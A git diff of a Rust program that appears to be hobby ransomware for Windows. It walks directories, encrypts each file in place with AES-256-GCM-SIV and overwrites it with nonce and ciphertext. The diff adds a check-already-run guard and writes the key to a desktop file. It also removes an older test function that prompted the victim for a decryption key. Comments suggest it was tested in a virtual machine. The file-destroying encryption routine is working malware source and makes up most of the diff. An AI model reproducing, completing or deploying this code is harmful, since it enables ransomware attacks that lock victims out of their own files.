@@ -1,4 +1,4 @@
-#![allow(warnings)]
+// #![allow(warnings)]
 #[allow(dead_code)]
 use aes_gcm_siv::aead::generic_array::GenericArray;
 use aes_gcm_siv::aead::Aead;
@@ -32,7 +32,7 @@ use walkdir::{DirEntry, Error, WalkDir};
  *
  * Returns: the cipher object
  */
-fn main() {
+fn main() -> Result<(), std::io::Error> {
     // create a popup on windows systems
 
     match Command::new("cmd")
@@ -48,6 +48,13 @@ fn main() {
         }
     }
 
+    if check_already_run() {
+        println!("Already run");
+        return Ok(());
+    } else {
+        println!("Not already run");
+    }
+
     let mut rng = ChaCha20Rng::from_entropy(); //FIXME: later. I dont like that this rng code is repeated twice
     let mut nonce_array = [0u8; 12];
     rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
@@ -59,74 +66,18 @@ fn main() {
                                          // writeln!(test_file.as_ref().unwrap(), "key: {:?}", hex::encode(&key));
     println!("Cipher key before user input: {:?}", hex::encode(&key));
     let _ = traverse(false, &mut cipher);
+    //write hex::
+    let mut keyfile = File::create("C:\\Users\\win11\\Desktop\\key.txt")?;
+    keyfile.write_all(&hex::encode(&key).as_bytes())?;
+    writeln!(keyfile, "\n\n\nhello")?;
+    drop(keyfile);
+    Ok(())
 }
 
-// fn display_message() {
-//     //popup WITH THE DECRYPTION KEY ON THE POPUP
-//     //idk what to use for thsi
-// }
-
-/**
- * This is a test function to make sure the encryption is working
- *
- * only encrypts the files on the desktop. used for testing so i dont break anything accidentally
- */
-// fn test_encryptfile() {
-//     //the file in the windows vm is called restored
-//     let mut testfile = File::open("restored").expect("can't open file o no");
-//     let mut buffer = Vec::new();
-//     testfile
-//         .read_to_end(&mut buffer)
-//         .expect("can't load file contents");
-
-//     //call the generate key function
-//     let mut rng = ChaCha20Rng::from_entropy();
-//     let mut nonce_array = [0u8; 12];
-//     rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
-//     let nonce = Nonce::from_slice(&nonce_array);
-
-//     //FIXME: up to here. making the nonce
-//     let key = Aes256GcmSiv::generate_key(rng);
-//     let cipher = Aes256GcmSiv::new(&key);
-
-//     let ciphertext = cipher.encrypt(nonce, buffer.as_ref());
-//     //put the ciphertext back in the file
-
-//     testfile.set_len(0);
-//     testfile.write_all(&ciphertext.unwrap().as_slice()); //tvector -> slice
-//                                                          //why this no work tho
-
-//     //print the key and nonce TODO: check if :? is alg or display
-//     println!("key: {:?}", key);
-
-//     //TODO: !!!!! read the contents of the file!
-//     //this will be in the completed code but not in this test function because im lazy
-
-//     loop {
-//         //delay and wait for user to enter the decryption key
-//         //TODO: print the key needed for decryption
-//         let mut user_input = String::new();
-//         println!("Enter decryption key pls: ");
-//         io::stdin().read_line(&mut user_input).unwrap();
-//         let user_input_str = user_input.as_bytes(); //convert to bytes
-
-//         //TODO: UP TO HERE TODAY
-//         //key length 32, nonce length 12
-//         if user_input_str.len() != 32 {
-//             //print error
-//             println!("Invalid key length");
-//         } else {
-//             // //FIXME: convert byte array into key format why this no work
-//             // //WHY THIS NO WORK
-//             // let user_key = GenericArray::clone_from_slice(&user_input_str[0..32]);
-//             // //decrypt using the key
-//             // let plaintext = cipher.decrypt(nonce, ciphertext.unwrap().as_ref());
-//         }
-//         //convert to key
-//     }
-//     //TODO: put user input into the correct variable type
-//     //try decrypting with this key, print if it works or not
-// }
+fn check_already_run() -> bool {
+    //if key.txt exists, then the program has already run. return true
+    Path::new("C:\\Users\\win11\\Desktop\\key.txt").exists()
+}
 
 /**
  *
@@ -272,23 +223,17 @@ fn encrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), std::io::Error> {
     //open existing "C:\\Users\\win11\\Desktop\\output.txt" and write the path to it
     // Open a file with append option
 
-    println!("encrypting file: {}", path.display()); //FIXME: error testing
-
+    println!("encrypting file: {}", path.display());
     let mut file = File::open(path)?;
     let mut buffer = Vec::new();
     file.read_to_end(&mut buffer)?;
-
     drop(file); //close the file (drop it)
-
     let mut file = File::create(path)?;
-
-    //TODO: make a nonce, use it, append to the beginning or end of file
     let mut rng = ChaCha20Rng::from_entropy();
     let mut nonce_array = [0u8; 12];
     rng.fill_bytes(&mut nonce_array);
     let nonce = Nonce::from_slice(&nonce_array);
     let ciphertext = cipher.encrypt(nonce, buffer.as_ref());
-    //put the ciphertext bac into the file
     let _ = file.set_len(0);
     file.write_all(&nonce_array)?;
     let _ = file.write_all(&ciphertext.unwrap().as_slice());
